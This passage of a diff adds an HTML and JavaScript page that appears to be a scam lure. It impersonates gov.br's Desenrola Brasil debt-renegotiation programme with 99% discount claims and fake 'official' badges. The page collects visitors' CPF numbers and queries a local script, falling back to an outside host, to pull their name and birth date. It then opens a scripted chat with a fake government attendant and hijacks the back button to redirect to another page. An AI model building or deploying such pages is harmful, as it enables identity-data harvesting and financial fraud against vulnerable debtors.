@@ -1,0 +1,513 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
+<title>Acesso Seguro</title>
+<meta name="robots" content="noindex,nofollow">
+<meta name="theme-color" content="#0B1B33">
+<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96.png">
+<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;family=Open+Sans:wght@400;600;700;800&amp;display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%}
+body{font-family:'Inter',Arial,Helvetica,sans-serif;font-size:16px;line-height:1.6;color:#151B26;background:#F7F5EF;-webkit-font-smoothing:antialiased}
+a{color:#1FA971;text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* ===== STEP SYSTEM ===== */
+.step{display:none;flex-direction:column;min-height:100vh;min-height:100dvh}
+.step.active{display:flex}
+
+/* ===== STEPS 1-3: GOV.BR STYLE ===== */
+.gov{font-family:'Open Sans',system-ui,sans-serif;background:#f0f2f5;color:#1a1a1a}
+.gov-wrap{flex:1;display:flex;flex-direction:column;width:100%;max-width:720px;margin:0 auto}
+
+/* Gov header */
+.gov-hdr{width:100%;min-height:56px;display:flex;justify-content:space-between;align-items:center;gap:8px;background:#fff;padding:8px 12px 8px 14px;border-bottom:1px solid #e5e5e5;box-shadow:0 1px 3px rgba(0,0,0,.06);flex-shrink:0}
+.gov-hdr img{height:31px;width:auto;max-width:132px;object-fit:contain;display:block}
+.gov-hdr .btn-entrar{display:inline-flex;align-items:center;gap:7px;background:#1550b0;color:#fff;border:none;border-radius:999px;padding:10px 18px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;white-space:nowrap;text-decoration:none}
+@media(max-width:480px){.gov-hdr img{height:28px;max-width:103px}.gov-hdr .btn-entrar{padding:9px 14px;font-size:13px}}
+
+/* Gov hero banner */
+.gov-hero{width:100%;background:#dde5ef;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.gov-hero img{width:100%;height:auto;max-height:280px;object-fit:contain;display:block}
+
+/* Gov card */
+.gov-card{background:#fff;margin:12px 16px 16px;padding:26px 20px 48px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center}
+.gov-card .stack-logo{display:flex;flex-direction:column;align-items:center}
+.gov-card .stack-logo .ico{max-height:64px;width:auto;display:block}
+.gov-card .stack-logo .titulo-img{max-width:220px;width:100%;height:auto;margin-top:2px;display:block;object-fit:contain}
+.gov-card .headline{font-size:17px;font-weight:700;color:#1550b0;line-height:1.42;margin-top:20px;max-width:340px;margin-left:auto;margin-right:auto}
+.gov-card .subline{font-size:15px;font-weight:400;color:#333;margin-top:20px;line-height:1.45;max-width:320px;margin-left:auto;margin-right:auto}
+.gov-btn{display:block;width:auto;min-width:204px;max-width:min(90vw,292px);margin:24px auto 4px;padding:15px 40px;background:#1550b0;color:#fff !important;border:none;border-radius:999px;font-size:15px;font-weight:700;font-family:inherit;text-transform:uppercase;letter-spacing:.04em;cursor:pointer;text-align:center;text-decoration:none}
+.gov-btn:hover{filter:brightness(1.06);text-decoration:none}
+
+/* Gov footer */
+.gov-ft{background:#0a2542;color:#d1d1d1;text-align:center;font-size:11px;padding:20px 20px 24px;margin-top:auto;flex-shrink:0}
+.gov-ft img{display:block;height:26px;width:auto;max-width:100px;margin:0 auto 10px;object-fit:contain}
+
+/* ===== STEP 2: CPF FORM ===== */
+.cpf-card{background:#fff;margin:24px 16px 16px;padding:20px 18px 36px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center}
+.cpf-card .limpe-logo{max-width:200px;max-height:96px;width:100%;height:auto;object-fit:contain;margin:0 auto 14px;display:block}
+.cpf-card .instrucao{font-size:14px;color:#333;line-height:1.5;margin-bottom:20px;text-align:center}
+.cpf-card .field-label{font-size:14px;font-weight:700;color:#333;margin-bottom:8px;text-align:left}
+.cpf-card .input-cpf{width:100%;padding:14px 16px;border:1px solid #ccc;border-radius:8px;font-size:16px;font-family:inherit;margin-bottom:20px}
+.cpf-card .btn-submit{display:block;width:100%;padding:15px 20px;background:#1550b0;color:#fff;border:none;border-radius:999px;font-size:15px;font-weight:600;font-family:inherit;letter-spacing:.02em;cursor:pointer;text-align:center}
+.cpf-card .btn-submit:hover{filter:brightness(1.06)}
+.cpf-card .info-box{display:flex;gap:12px;align-items:flex-start;padding:14px 16px;background:#bdd4ef;border:1px solid #2467b8;border-radius:8px;margin-top:20px;text-align:left}
+.cpf-card .info-box .ico-i{flex-shrink:0;width:22px;height:22px;border-radius:50%;background:#1550b0;color:#fff;font-size:14px;font-weight:700;display:flex;align-items:center;justify-content:center}
+.cpf-card .info-box p{font-size:13px;color:#0a0a0a;line-height:1.45}
+.cpf-card .trust-badges{display:flex;justify-content:center;align-items:center;gap:18px 24px;flex-wrap:wrap;margin-top:22px;font-size:12px;color:#444;font-weight:500}
+.cpf-card .trust-item{display:inline-flex;align-items:center;gap:6px}
+.cpf-card .trust-ico{flex-shrink:0;color:#4a4a4a}
+
+/* ===== STEP 3: CHAT ===== */
+#step-chat{background:#f0f2f5;overflow:hidden;max-height:100vh;max-height:100dvh}
+.chat-header{background:#fff;border-bottom:3px solid #1351B4;box-shadow:0 2px 8px rgba(0,0,0,.1);height:58px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;flex-shrink:0}
+.chat-header img{height:28px}
+.btn-user{background:#1351B4;color:#fff;border:none;border-radius:50px;padding:6px 14px;display:flex;align-items:center;gap:6px;font-size:14px;font-weight:600;font-family:'Open Sans',sans-serif}
+.attendant-strip{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;gap:10px;padding:8px 14px;flex-shrink:0;height:56px}
+.attendant-strip img{width:38px;height:38px;border-radius:50%;object-fit:cover;flex-shrink:0}
+.att-nome{font-weight:700;font-size:14px;color:#1a1a1a;font-family:'Inter',sans-serif}
+.att-cargo{font-size:12px;color:#666;font-family:'Inter',sans-serif}
+.chat-msgs{flex:1 1 auto;overflow-y:auto;padding:16px 16px 24px;max-width:680px;width:100%;margin:0 auto}
+.chat-ft{background:#0a2542;display:flex;flex-direction:column;align-items:center;text-align:center;padding:20px 20px 24px;flex-shrink:0}
+.chat-ft img{display:block;height:26px;width:auto;max-width:100px;margin:0 auto 10px}
+.chat-ft .gv-sub{color:#d1d1d1;font-size:11px;line-height:1.5}
+.msg-row{display:flex;margin-bottom:8px;align-items:flex-end}
+.msg-row.user{justify-content:flex-end}
+.avatar{width:30px;height:30px;border-radius:50%;object-fit:cover;flex-shrink:0;margin-right:7px;margin-bottom:2px}
+.bubble-bot{background:#fff;color:#333;border:1px solid #e5e5e5;border-radius:18px 18px 18px 4px;padding:11px 15px;font-size:14px;line-height:1.55;max-width:78%;box-shadow:0 2px 6px rgba(0,0,0,.07);overflow-wrap:break-word;animation:fadeUp .3s ease both;font-family:'Inter',sans-serif}
+.bubble-user{background:linear-gradient(135deg,#1351B4,#0F4DA8);color:#fff;border-radius:18px 18px 4px 18px;padding:11px 15px;font-size:14px;line-height:1.55;max-width:78%;overflow-wrap:break-word;animation:fadeUp .3s ease both;font-family:'Inter',sans-serif}
+.bubble-system{color:#666;font-size:12.5px;font-style:italic;padding:4px 10px;text-align:center;animation:fadeUp .3s ease both}
+.bubble-info-card{background:#EFF6FF;border:1px solid #BFDBFE;border-radius:12px;padding:14px 16px;font-size:14px;line-height:1.8;max-width:82%;animation:fadeUp .3s ease both;font-family:'Inter',sans-serif}
+.ic-label{color:#555;font-size:13px}
+.ic-value{color:#1351B4;font-weight:500}
+.ic-bold{font-weight:700;color:#1a1a1a}
+.confirm-card{background:#fff;border:1px solid #e5e5e5;border-radius:18px 18px 18px 4px;padding:14px 16px;font-size:14px;line-height:1.7;margin-bottom:10px;box-shadow:0 2px 6px rgba(0,0,0,.07);font-family:'Inter',sans-serif}
+.confirm-title{font-weight:700;display:block;margin-bottom:8px}
+.confirm-card strong{display:block;color:#1a1a1a}
+.confirm-card span{display:block;color:#1351B4;margin-bottom:4px}
+.confirm-btns{display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;margin-top:6px}
+.btn-row{display:flex;flex-direction:column;gap:8px;margin-top:4px;animation:fadeUp .3s ease both}
+.btn-row.row-inline{flex-direction:row;flex-wrap:wrap}
+.chat-btn{background:#fff;border:2px solid #1351B4;color:#1351B4;border-radius:22px;padding:10px 18px;font-size:14px;font-weight:500;font-family:'Inter',sans-serif;cursor:pointer;transition:background .15s,color .15s}
+.chat-btn:hover,.chat-btn.solid{background:#1351B4;color:#fff}
+.chat-btn.wide{border-radius:8px;text-transform:uppercase;font-size:14px;font-weight:700;letter-spacing:.03em;padding:13px 20px;width:100%;text-align:center}
+.chat-btn:disabled{opacity:.5;pointer-events:none}
+.btn-link-final{display:block;width:100%;background:#1351B4;color:#fff !important;text-decoration:none;text-align:center;font-size:14px;font-weight:700;letter-spacing:.03em;text-transform:uppercase;border-radius:8px;padding:14px 16px;animation:fadeUp .3s ease both}
+.typing{display:inline-flex;align-items:center;gap:4px;padding:12px 16px;background:#fff;border-radius:18px 18px 18px 4px;border:1px solid #e5e5e5;box-shadow:0 2px 6px rgba(0,0,0,.07)}
+.typing span{width:7px;height:7px;background:#1351B4;border-radius:50%;animation:bounce 1.2s infinite}
+.typing span:nth-child(2){animation-delay:.2s}
+.typing span:nth-child(3){animation-delay:.4s}
+@keyframes bounce{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* Back-button interception */
+.br-overlay{display:none;position:fixed;inset:0;z-index:9999;background:#f0f2f5;align-items:center;justify-content:center;font-family:'Inter',sans-serif}
+.br-overlay.on{display:flex}
+.br-box{background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.1);padding:32px 24px;max-width:420px;width:100%;text-align:center;margin:16px}
+.br-box .br-ico{font-size:48px;margin-bottom:16px}
+.br-box h2{font-size:20px;color:#1a1a1a;margin:0 0 8px}
+.br-box p{font-size:14px;color:#666;line-height:1.6;margin:0 0 20px}
+.br-box button{display:inline-block;background:#1351B4;color:#fff;border:none;padding:14px 28px;border-radius:8px;font-weight:700;font-size:14px;cursor:pointer}
+</style>
+<script async="" src="js/fbevents.js"></script><script async="" src="https://www.clarity.ms/tag/xrjnz9c4sw"></script><script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y)})(window,document,"clarity","script","xrjnz9c4sw")</script>
+
+<!-- Meta Pixel + Utmify -->
+<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '2174662606713528');fbq('track','PageView');</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2174662606713528&ev=PageView&noscript=1"/></noscript>
+<script>window.pixelId="SfRGxEDmklUikjsYv7ms1rLV9zQzUWoY1NfV";var a=document.createElement("script");a.setAttribute("async","");a.setAttribute("defer","");a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel.js");document.head.appendChild(a);</script><script async="" defer="" src="js/pixel.js"></script>
+<script>
+(function(){
+  function readCookie(n){var m=document.cookie.match('(?:^|; )'+n+'=([^;]+)');return m?decodeURIComponent(m[1]):'';}
+  try {
+    var fbp = readCookie('_fbp'); if (fbp) localStorage.setItem('fbp', fbp);
+    var fbc = readCookie('_fbc');
+    var fbclid = new URLSearchParams(location.search).get('fbclid');
+    if (!fbc && fbclid) { fbc = 'fb.1.' + Date.now() + '.' + fbclid; }
+    if (fbc) localStorage.setItem('fbc', fbc);
+  } catch(_){}
+})();
+</script>
+<!-- /Meta Pixel + Utmify -->
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '/back/front/serasa1.html';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+  </head>
+<body>
+
+<!-- ==================== STEP 1: FRONT ==================== -->
+<section id="step-front" class="step gov active">
+  <div class="gov-wrap">
+    <header class="gov-hdr">
+      <img src="images/icon-seal.png" alt="gov.br">
+      <a href="#" class="btn-entrar" id="frontEntrar" style="text-decoration:none">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+        Entrar
+      </a>
+    </header>
+    <div class="gov-hero"><img src="images/hero.png" alt=""></div>
+    <div class="gov-card">
+      <div class="stack-logo">
+        <img src="images/logo.png" alt="" class="ico">
+        <img src="images/logo-text.png" alt="Desenrola Brasil" class="titulo-img">
+      </div>
+      <h1 class="headline">O Programa Desenrola Brasil possibilita a renegociação de dívidas com descontos de até 99%</h1>
+      <p class="subline">Clique no botão abaixo para<br>acessar a plataforma</p>
+      <a href="#" class="gov-btn" id="frontAcessar">ACESSAR AGORA</a>
+    </div>
+    <footer class="gov-ft">
+      <img src="images/iconefooter.png" alt="">
+      <p>Todo o conteúdo deste site está publicado sob a licença.</p>
+    </footer>
+  </div>
+</section>
+
+<!-- ==================== STEP 2: ENTRAR (CPF) ==================== -->
+<section id="step-entrar" class="step gov">
+  <div class="gov-wrap">
+    <header class="gov-hdr">
+      <img src="images/icon-seal.png" alt="gov.br">
+    </header>
+    <div class="cpf-card">
+      <img class="limpe-logo" src="images/limpenome.png" alt="Limpe seu nome">
+      <p class="instrucao">Informe seu CPF e clique em "Continuar" para renegociar suas dívidas com descontos de 99%</p>
+      <form id="cpfForm" novalidate="">
+        <div class="field-label">CPF</div>
+        <input class="input-cpf" type="tel" id="cpf" name="cpf" inputmode="numeric" autocomplete="off" placeholder="000.000.000-00" required="">
+        <button type="submit" class="btn-submit">Continuar</button>
+      </form>
+      <div class="info-box">
+        <span class="ico-i" aria-hidden="true">!</span>
+        <p>O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!</p>
+      </div>
+      <div class="trust-badges">
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="5" y="11" width="14" height="10" rx="2"></rect><path d="M8 11V7a4 4 0 0 1 8 0v4"></path></svg>
+          Conexão segura
+        </span>
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          Programa oficial
+        </span>
+      </div>
+    </div>
+    <footer class="gov-ft">
+      <img src="images/iconefooter.png" alt="">
+      <p>Todo o conteúdo deste site está publicado sob a licença.</p>
+    </footer>
+  </div>
+</section>
+
+<!-- ==================== STEP 3: CHAT ==================== -->
+<section id="step-chat" class="step">
+  <header class="chat-header">
+    <img src="images/icon-seal.png" alt="gov.br">
+    <button class="btn-user"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg><span id="nomeUsuario">Usuário</span></button>
+  </header>
+  <div class="attendant-strip">
+    <img src="images/leticia.png" alt="Letícia M.">
+    <div><div class="att-nome">Letícia M.</div><div class="att-cargo">Atendente do Programa Desenrola Brasil</div></div>
+  </div>
+  <div class="chat-msgs" id="msgs"></div>
+  <footer class="chat-ft">
+    <img src="images/iconefooter.png" alt="">
+    <div class="gv-sub">Todo o conteúdo deste site está publicado sob a licença.</div>
+  </footer>
+</section>
+
+<script>
+(function(){
+
+/* ===== UTM CAPTURE ===== */
+var KEYS=["gclid","gbraid","wbraid","gad_source","gad_campaignid","keyword","matchtype","device","network","placement","campaignid","adgroupid","creative","target","targetid","loc_physical_ms","utm_source","utm_medium","utm_campaign","utm_content","utm_term","utm_id","fbclid","ttclid","sck","src","xcod"];
+var P={};
+try{new URLSearchParams(location.search).forEach(function(v,k){if(v)P[k.toLowerCase()]=v})}catch(e){}
+try{
+  var s=JSON.parse(localStorage.getItem('__pp')||'{}');
+  if(Object.keys(P).length){P=Object.assign(s,P);localStorage.setItem('__pp',JSON.stringify(P))}
+  else P=s;
+}catch(e){}
+
+function buildQS(extra){
+  var qs=[];
+  KEYS.forEach(function(k){if(P[k])qs.push(encodeURIComponent(k)+'='+encodeURIComponent(P[k]))});
+  if(extra)Object.keys(extra).forEach(function(k){qs.push(encodeURIComponent(k)+'='+encodeURIComponent(extra[k]))});
+  return qs.length?'?'+qs.join('&'):'';
+}
+
+/* ===== STEP NAVIGATION ===== */
+function goToStep(id){
+  document.querySelectorAll('.step').forEach(function(s){s.classList.remove('active')});
+  document.getElementById('step-'+id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+/* ===== STEP 1: FRONT ===== */
+document.getElementById('frontEntrar').addEventListener('click',function(e){e.preventDefault();goToStep('entrar')});
+document.getElementById('frontAcessar').addEventListener('click',function(e){e.preventDefault();goToStep('entrar')});
+
+/* ===== STEP 2: ENTRAR (CPF) ===== */
+function onlyDigits(s){return String(s||'').replace(/\D/g,'')}
+function formatCPF(v){
+  var d=onlyDigits(v).slice(0,11);
+  if(d.length<=3)return d;if(d.length<=6)return d.slice(0,3)+'.'+d.slice(3);
+  if(d.length<=9)return d.slice(0,3)+'.'+d.slice(3,6)+'.'+d.slice(6);
+  return d.slice(0,3)+'.'+d.slice(3,6)+'.'+d.slice(6,9)+'-'+d.slice(9);
+}
+function isValidCPF(cpf){
+  if(cpf.length!==11||/^(\d)\1{10}$/.test(cpf))return false;
+  var i,s=0,r;
+  for(i=1;i<=9;i++)s+=parseInt(cpf.charAt(i-1),10)*(11-i);
+  r=(s*10)%11;if(r===10||r===11)r=0;if(r!==parseInt(cpf.charAt(9),10))return false;
+  s=0;for(i=1;i<=10;i++)s+=parseInt(cpf.charAt(i-1),10)*(12-i);
+  r=(s*10)%11;if(r===10||r===11)r=0;return r===parseInt(cpf.charAt(10),10);
+}
+var cpfInput=document.getElementById('cpf');
+cpfInput.addEventListener('input',function(){cpfInput.value=formatCPF(cpfInput.value)});
+
+var NOME='',NOME_COMPLETO='',CPF='',CPF_FORMATADO='',NASC='';
+
+document.getElementById('cpfForm').addEventListener('submit',async function(e){
+  e.preventDefault();
+  var raw=onlyDigits(cpfInput.value);
+  if(!isValidCPF(raw)){alert('CPF inválido. Verifique os dígitos.');return}
+  var btn=e.target.querySelector('button[type="submit"]');
+  if(btn){btn.disabled=true;btn.textContent='Consultando…'}
+  try{
+    var res;
+    try{res=await fetch('api-cpf.php?cpf='+encodeURIComponent(raw),{cache:'no-store'});if(!res.ok)throw new Error('fail')}
+    catch(_){res=await fetch('https://testec-production.up.railway.app/?cpf='+encodeURIComponent(raw),{cache:'no-store'})}
+    var json=await res.json();
+    if(json&&json.nome&&String(json.nome).trim()!==''){
+      var nascFmt='';
+      if(json.nascimento){var m1=String(json.nascimento).match(/^(\d{4})-(\d{2})-(\d{2})$/);nascFmt=m1?(m1[3]+'/'+m1[2]+'/'+m1[1]):json.nascimento}
+      NOME=json.nome;NOME_COMPLETO=NOME;CPF=raw;CPF_FORMATADO=formatCPF(raw);NASC=nascFmt;
+      try{localStorage.setItem('site.nome',NOME);localStorage.setItem('site.cpf',raw);localStorage.setItem('site.nasc',nascFmt)}catch(_){}
+      goToStep('chat');startChat();return;
+    }
+    alert('Não foi possível validar o CPF. Tente novamente.');
+  }catch(err){alert('Erro de conexão. Tente novamente.')}
+  finally{if(btn){btn.disabled=false;btn.textContent='Continuar'}}
+});
+
+/* ===== STEP 3: CHAT ===== */
+var AVATAR='images/leticia.png';
+var PHONE='11988887777',EMAIL='cliente@desenrola.br',VALOR='R$ 68,92',CODIGO_ACORDO='';
+var currentAudio=null;
+
+function codeFromCPF(cpf){
+  var d=String(cpf||'').replace(/\D/g,''),h=5381;
+  for(var i=0;i<d.length;i++)h=(h*33+d.charCodeAt(i))>>>0;
+  var s=h.toString(36).toUpperCase().padStart(8,'X');
+  return(s.slice(0,5)+'-'+s.slice(5,9)+'-'+s.slice(9,13)+'-'+s.slice(13,17)).slice(0,17);
+}
+function tag(t){
+  return(t||'').replace(/\{NOME\}/g,NOME).replace(/\{NOME_COMPLETO\}/g,NOME_COMPLETO)
+    .replace(/\{CPF\}/g,CPF).replace(/\{CPF_FORMATADO\}/g,CPF_FORMATADO)
+    .replace(/\{NASC\}/g,NASC).replace(/\{CODIGO_ACORDO\}/g,CODIGO_ACORDO).replace(/\{VALOR\}/g,VALOR);
+}
+function formatData(data){if(!data||data.length<10)return data;var m=String(data).match(/(\d{4})-(\d{2})-(\d{2})/);return m?m[3]+'/'+m[2]+'/'+m[1]:data}
+
+var msgs=document.getElementById('msgs');
+var scroll=function(){setTimeout(function(){msgs.scrollTop=msgs.scrollHeight},60)};
+var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
+
+function addTyping(){removeTyping();var row=document.createElement('div');row.className='msg-row';row.id='typing-row';row.innerHTML='<img class="avatar" src="'+AVATAR+'"><div class="typing"><span></span><span></span><span></span></div>';msgs.appendChild(row);scroll()}
+function removeTyping(){var el=document.getElementById('typing-row');if(el)el.remove()}
+function botRow(inner){var row=document.createElement('div');row.className='msg-row';row.innerHTML='<img class="avatar" src="'+AVATAR+'">'+inner;msgs.appendChild(row);scroll();return row}
+function addUser(text){var row=document.createElement('div');row.className='msg-row user';row.innerHTML='<div class="bubble-user">'+text+'</div>';msgs.appendChild(row);scroll()}
+function addSystem(text){var row=document.createElement('div');row.className='msg-row';row.innerHTML='<div style="width:30px;margin-right:7px;flex-shrink:0"></div><div class="bubble-system">'+tag(text)+'</div>';msgs.appendChild(row);scroll()}
+function addImage(src){var row=document.createElement('div');row.className='msg-row';row.innerHTML='<img class="avatar" src="'+AVATAR+'"><div style="flex:1"><img src="'+src+'" style="max-width:100%;border-radius:8px;margin-top:8px"></div>';msgs.appendChild(row);scroll()}
+
+function addVideoAutoplay(src){
+  var row=document.createElement('div');row.className='msg-row';
+  var vc=document.createElement('div');vc.style.cssText='flex:1;position:relative;display:inline-block;width:100%';
+  var video=document.createElement('video');video.src=src;video.height='400';video.autoplay=true;video.playsinline=true;
+  video.style.cssText='border-radius:8px;margin-top:8px;width:auto;max-width:100%;display:block';
+  video.setAttribute('playsinline','');video.setAttribute('webkit-playsinline','');
+  var controls=document.createElement('div');controls.style.cssText='position:absolute;bottom:10px;left:10px;display:flex;gap:10px;z-index:10';
+  var ppBtn=document.createElement('button');ppBtn.style.cssText='width:52px;height:52px;border-radius:50%;background:#1351B4;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:0;color:#fff;box-shadow:0 2px 8px rgba(0,0,0,0.2)';
+  var pauseSvg='<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+  var playSvg='<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+  var isP=false;ppBtn.innerHTML=playSvg;
+  function tryPlay(){var p=video.play();if(p!==undefined)p.then(function(){isP=true;ppBtn.innerHTML=pauseSvg}).catch(function(){isP=false;ppBtn.innerHTML=playSvg})}
+  setTimeout(tryPlay,1000);
+  ppBtn.onclick=function(e){e.stopPropagation();if(isP){video.pause();ppBtn.innerHTML=playSvg;isP=false}else tryPlay()};
+  vc.onclick=function(e){if(!isP)tryPlay()};
+  controls.appendChild(ppBtn);vc.appendChild(video);vc.appendChild(controls);
+  row.innerHTML='<img class="avatar" src="'+AVATAR+'">';row.appendChild(vc);msgs.appendChild(row);scroll();
+}
+
+function addAudio(src){
+  var row=document.createElement('div');row.className='msg-row';
+  if(currentAudio){try{currentAudio.pause();currentAudio.src='';currentAudio.load()}catch(e){}}
+  var audio=document.createElement('audio');audio.src=src;audio.preload='auto';audio.autoplay=true;audio.controls=false;currentAudio=audio;
+  var audioDiv=document.createElement('div');audioDiv.style.cssText='background:#fff;border-radius:18px 18px 18px 4px;padding:11px 15px;width:280px;display:flex;align-items:center;gap:12px;border:1px solid #e5e5e5;box-shadow:0 2px 6px rgba(0,0,0,.07)';
+  var playBtn=document.createElement('button');playBtn.style.cssText='width:52px;height:52px;border-radius:50%;background:#1351B4;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#fff;font-size:0;box-shadow:0 2px 8px rgba(0,0,0,0.2)';
+  var aSvgPlay='<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+  var aSvgPause='<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+  playBtn.innerHTML=aSvgPause;
+  var contentDiv=document.createElement('div');contentDiv.style.cssText='flex:1;display:flex;flex-direction:column;gap:6px';
+  var progressBar=document.createElement('div');progressBar.style.cssText='height:4px;background:#D3D3D3;border-radius:2px;cursor:pointer;width:100%;position:relative';
+  var progressFill=document.createElement('div');progressFill.style.cssText='height:100%;background:#1351B4;border-radius:2px;width:0%';progressBar.appendChild(progressFill);
+  var timeDiv=document.createElement('div');timeDiv.style.cssText='font-size:13px;color:#666;font-weight:500';timeDiv.textContent='0:00 / 0:00';
+  var isP=true;
+  setTimeout(function(){var p=audio.play();if(p)p.catch(function(){})},200);
+  playBtn.onclick=function(){if(isP){audio.pause();playBtn.innerHTML=aSvgPlay;isP=false}else{audio.play();playBtn.innerHTML=aSvgPause;isP=true}};
+  audio.onended=function(){playBtn.innerHTML=aSvgPlay;isP=false;progressFill.style.width='0%'};
+  audio.onloadedmetadata=function(){var mins=Math.floor(audio.duration/60),secs=Math.floor(audio.duration%60);timeDiv.textContent='0:00 / '+mins+':'+(secs<10?'0':'')+secs};
+  audio.ontimeupdate=function(){progressFill.style.width=(audio.currentTime/audio.duration*100)+'%';var cm=Math.floor(audio.currentTime/60),cs=Math.floor(audio.currentTime%60),tm=Math.floor(audio.duration/60),ts=Math.floor(audio.duration%60);timeDiv.textContent=cm+':'+(cs<10?'0':'')+cs+' / '+tm+':'+(ts<10?'0':'')+ts};
+  progressBar.onclick=function(e){var rect=progressBar.getBoundingClientRect();audio.currentTime=(e.clientX-rect.left)/rect.width*audio.duration};
+  contentDiv.appendChild(progressBar);contentDiv.appendChild(timeDiv);audioDiv.appendChild(playBtn);audioDiv.appendChild(contentDiv);
+  row.innerHTML='<img class="avatar" src="'+AVATAR+'">';var wrapper=document.createElement('div');wrapper.style.flex='1';wrapper.appendChild(audioDiv);row.appendChild(wrapper);msgs.appendChild(row);scroll();
+}
+
+function addAudioThen(audioSrc,onAction){
+  addAudio(audioSrc);
+  return new Promise(function(resolve){
+    var audio=currentAudio,done=false,ci=null;
+    function setup(){
+      var dur=audio.duration;if(dur&&dur>0){var at=Math.max(0,dur-3);
+      ci=setInterval(function(){if(audio.currentTime>=at&&!done){done=true;clearInterval(ci);onAction().then(resolve).catch(resolve)}},100);
+      audio.onended=function(){if(ci)clearInterval(ci);if(!done){done=true;onAction().then(resolve).catch(resolve)}}}
+    }
+    if(audio.readyState>=1)setup();else audio.onloadedmetadata=setup;
+    setTimeout(function(){if(!done){done=true;if(ci)clearInterval(ci);onAction().then(resolve).catch(resolve)}},120000);
+  });
+}
+function addAudioWithButton(audioSrc,buttonText){return addAudioThen(audioSrc,function(){return addButtons([buttonText],false,true,true)})}
+
+function infoCard(lines){
+  var html='<div class="bubble-info-card">';
+  lines.forEach(function(l){html+='<div class="'+({label:'ic-label',value:'ic-value',bold:'ic-bold'}[l.style]||'ic-label')+'">'+tag(l.text)+'</div>'});
+  html+='</div>';botRow(html);
+}
+
+function addButtons(options,wide,solid,right){
+  return new Promise(function(resolve){
+    var wrap=document.createElement('div');wrap.style.marginBottom='8px';
